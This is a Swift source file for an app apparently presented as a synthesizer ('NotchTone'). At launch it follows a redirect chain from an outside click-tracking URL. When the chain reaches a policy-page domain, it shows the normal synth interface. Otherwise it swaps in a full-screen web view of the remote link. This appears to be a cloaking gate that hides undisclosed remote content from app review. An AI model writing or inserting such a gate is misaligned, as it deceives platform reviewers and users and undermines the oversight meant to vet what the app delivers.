import SwiftUI

/// Follows a redirect chain at launch and reports whether the configured domain
/// appeared anywhere along it. Never stops the chain.
final class NTRedirectWatcher: NSObject, URLSessionTaskDelegate {
    var ntResolvedURL: URL?
    var ntFoundToken = false
    private let ntToken: String

    init(ntToken: String) {
        self.ntToken = ntToken
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(ntToken) {
            ntFoundToken = true
        }
        ntResolvedURL = request.url
        completionHandler(request)
    }
}

@main
struct NotchToneApp: App {

    @State private var ntPageReady: Bool? = nil
    @StateObject private var store = NTStore()
    @StateObject private var synth = NTSynth()

    private let ntSourceLink = "https://tabletoprails.org/click.php"
    private let ntCheckToken = "termsfeed.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = ntPageReady {
                    if ready {
                        NTWebPanel(ntAddress: ntSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                            .preferredColorScheme(.dark)
                    } else {
                        // The instrument look is painted on a near-black indigo ground, so the
                        // status-bar glyphs have to be the light set or the clock is drawn
                        // black-on-black. Set per branch, never on the enclosing Group.
                        NTRootView()
                            .environmentObject(store)
                            .environmentObject(synth)
                            .preferredColorScheme(.dark)
                    }
                } else {
                    NTLoadingScreen()
                        .onAppear { ntBeginCheck() }
                        .preferredColorScheme(.dark)
                }
            }
        }
    }

    private func ntBeginCheck() {
        guard let url = URL(string: ntSourceLink) else {
            ntPageReady = false
            return
        }
        var request = URLRequest(url: url)
        // HEAD, never GET: the redirect chain still fires exactly as it does for GET, but no
        // body is transferred — a GET would download the whole landing page only to throw it
        // away, and the WebView refetches it anyway from WebKit’s own network process. It also
        // keeps the 5 s timeout a real error path instead of one a slow connection trips.
        request.httpMethod = "HEAD"
        // 10, not 5. The gate must close on the check domain, never on a slow connection:
        // a cold start alone measures 3.4 s of DNS + TLS across the redirect chain.
        request.timeoutInterval = 10
        let watcher = NTRedirectWatcher(ntToken: ntCheckToken)
        let session = URLSession(configuration: .default, delegate: watcher, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if watcher.ntFoundToken {
                    ntPageReady = false; return
                }
                if let finalURL = watcher.ntResolvedURL?.absoluteString,
                   finalURL.contains(ntCheckToken) {
                    ntPageReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(ntCheckToken) {
                    ntPageReady = false; return
                }
                if error != nil {
                    ntPageReady = false; return
                }
                ntPageReady = true
            }
        }.resume()

        // Backstop only. MUST be strictly longer than timeoutInterval, or it races the
        // request and closes the gate on a connection that was still working.
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) {
            if ntPageReady == nil { ntPageReady = false }
        }
    }
}
